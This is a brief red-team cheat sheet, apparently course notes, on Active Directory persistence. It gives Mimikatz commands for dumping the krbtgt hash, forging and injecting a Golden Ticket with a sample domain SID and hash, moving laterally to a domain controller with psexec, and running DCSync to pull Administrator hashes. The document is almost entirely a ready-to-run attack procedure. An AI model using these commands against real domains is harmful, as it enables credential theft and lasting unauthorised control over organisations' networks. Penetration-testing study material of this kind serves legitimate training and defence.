## Active Directory Persistence

### Golden Tickets

You must either have access to an account that is a member of the Domain Admins group or have compromised a DC to get the hash of krbtgt.

##### Get the krbtgt Hash Directly from the DC

1. Open Mimikatz in an elevated prompt

2. Issue the following to dump the password hashes and record the hash of `krbtgt`

   ```powershell
   privilege::debug
   lsadump::lsa /patch
   ```

#### Create the Golden Ticket

Creating the Golden ticket doesn't require admin privileges or even a machine on the domain.  

1. From any compromised Windows machine, run Mimikatz from a prompt:

2. Clear the Kerberos tickets, create the Golden Ticket using a made up user and load it into memory

   ```powershell
   kerberos::purge
   kerberos::golden /user:docrobot /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /krbtgt:fc274a94b36874d2560a7bd332604fab /ptt
   ```

#### Use the Ticket

This is a variation of the Overpass the Hash technique

1. Launch a new command prompt from Mimikatz:

   ```powershell
   misc::cmd
   ```

2. From this command prompt, attempt a lateral movement using PSExec
   Note: You must connect using the hostname.  The IP address will force the use of NTLM authentication, which would be blocked.

   ```powershell
   psexec.exe \\dc01 cmd.exe
   ```

3. You can verify the user and group membership in the new shell, which should show the fake user and the high-value groups

   ```powershell
   whoami
   whoami /groups
   ```

### Domain Controller Synchronization

This technique doesn't require any tools or logging into the DC, but it does require a user in the Domain Admin group logged into a compromised domain connected machine.

1. Run mimikatz

2. From mimikatz, issue a DC Sync command, specifying a user to display hashes for

   ```powershell
   lsadump::dcsync /user:Administrator
   ```

   